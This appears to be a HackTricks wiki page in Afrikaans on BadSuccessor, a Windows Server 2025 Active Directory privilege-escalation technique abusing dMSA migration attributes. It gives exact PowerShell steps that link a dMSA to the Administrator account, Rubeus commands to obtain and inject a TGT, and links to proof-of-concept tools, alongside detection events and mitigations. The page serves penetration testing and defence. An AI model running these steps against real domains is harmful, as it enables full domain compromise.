# BadSuccessor: Privilege Escalation via Delegated MSA Migration Abuse

{{#include ../../banners/hacktricks-training.md}}

## Oorsig

Delegated Managed Service Accounts (**dMSA**) is die volgende-generasie opvolger van **gMSA** wat saam met Windows Server 2025 bekendgestel word. ’n Legitieme migrasiewerkvloei stel administrateurs in staat om ’n *ou* rekening (gebruiker-, rekenaar- of diensrekening) met ’n dMSA te vervang terwyl toestemmings deursigtig behoue bly. Die werkvloei is beskikbaar deur PowerShell-cmdlets soos `Start-ADServiceAccountMigration` en `Complete-ADServiceAccountMigration` en maak staat op twee LDAP-kenmerke van die **dMSA-object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN-skakel* na die rekening wat vervang is (die ou rekening).
* **`msDS-DelegatedMSAState`**       – migrasietoestand (`0` = geen, `1` = aan die gang, `2` = *voltooi*).<sup>[[1]](#references)</sup>

As ’n aanvaller enige dMSA binne ’n OU kan skep en daardie 2 kenmerke direk kan manipuleer, sal LSASS en die KDC die dMSA as ’n *opvolger* van die gekoppelde rekening hanteer. Wanneer die aanvaller daarna as die dMSA staaf, **erf hulle al die voorregte van die gekoppelde rekening** – tot by **Domain Admin** indien die Administrator-rekening gekoppel is.<sup>[[1]](#references)</sup>

Unit 42 het hierdie tegniek in 2025 **BadSuccessor** genoem. Microsoft het dit later **CVE-2025-53779** toegeken en ’n sekuriteitsopdatering in **Augustus 2025** vrygestel. Die tegniek is steeds relevant vir omgewings met ongepatchte Windows Server 2025 en vir oudits van gevaarlike OU-delegering.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

Op gepatchte DC's kan ’n [tweesydige dMSA-migrasie](acl-persistence-abuse/BadSuccessor.md#bettersuccessor-after-the-kdc-patch) steeds ’n teikenrekening blootstel wanneer die aanvaller ook die migrasiekenmerke daarvan kan skryf. Dit is ’n nouer aanval as die oorspronklike aanval op enige teiken.

### Aanvalvoorvereistes

1. ’n Rekening wat *toegelaat word* om objecte binne **’n Organizational Unit (OU)** te skep *en* ten minste een van die volgende toestemmings het:
   * `Create Child` → **`msDS-DelegatedManagedServiceAccount`**-objectklas
   * `Create Child` → **`All Objects`** (generiese skepping)
2. Netwerkverbinding met LDAP en Kerberos (standaard domein-aangeslote scenario / afgeleë aanval).<sup>[[1]](#references)</sup>

## Enumerering van kwesbare OUs

Unit 42 het ’n PowerShell-helper-script vrygestel wat die sekuriteitsbeskrywings van elke OU ontleed en die vereiste ACE's uitlig:<sup>[[1]](#references)</sup>

```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```

Onder die kap hardloop die script ’n gepagineerde LDAP-soektog vir `(objectClass=organizationalUnit)` en kontroleer elke `nTSecurityDescriptor` vir

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (objekklas *msDS-DelegatedManagedServiceAccount*)

## Uitbuitingstappe

Sodra ’n skryfbare OU geïdentifiseer is, is die aanval net 3 LDAP-skryfbewerkings ver:<sup>[[1]](#references)</sup>

```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
                     -DNSHostName host.contoso.local \
                     -Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
    @{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Na replikasie kan die aanvaller eenvoudig as `attacker_dMSA$` **logon** of ’n Kerberos TGT aanvra – Windows sal die token van die *vervangde* rekening bou.<sup>[[1]](#references)</sup>

### Outomatisering

Verskeie openbare PoCs omvat die hele werkvloei, insluitend wagwoordherwinning en kaartjiebeheer:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec-module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation

```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```

## Opsporing & Jag

Aktiveer **Object Auditing** op OUs en monitor vir die volgende Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Skepping van die **dMSA**-objek
* **5136** – Wysiging van **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Spesifieke kenmerkveranderinge
  * GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
  * GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Uitreiking van 'n TGT vir die dMSA

Korrelasie van `4662` (kenmerkwysiging), `4741` (skepping van 'n rekenaar-/diensrekening) en `4624` (daaropvolgende aanmelding) bring BadSuccessor-aktiwiteit vinnig aan die lig. XDR-oplossings soos **XSIAM** sluit gereed-vir-gebruik navrae in (sien verwysings).<sup>[[2]](#references)</sup>

## Versagting

* Pas Microsoft se sekuriteitsopdatering vir **CVE-2025-53779** toe en verifieer die pleistervlak van elke Windows Server 2025-domeinbeheerder.<sup>[[6]](#references)</sup>
* Pas die beginsel van **minste voorregte** toe – delegeer die bestuur van *Service Account*s slegs aan vertroude rolle.
* Verwyder `Create Child` / `msDS-DelegatedManagedServiceAccount` van OUs wat dit nie uitdruklik benodig nie.
* Monitor vir die gebeurtenis-ID's hierbo en maak 'n waarskuwing wanneer identiteite buite *Tier-0* dMSAs skep of wysig.

## Sien ook


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Misbruik van dMSA om voorregte in Active Directory te verhoog – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Wanneer goeie rekeninge sleg raak: Uitbuiting van gedelegeerde bestuurde diensrekeninge](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
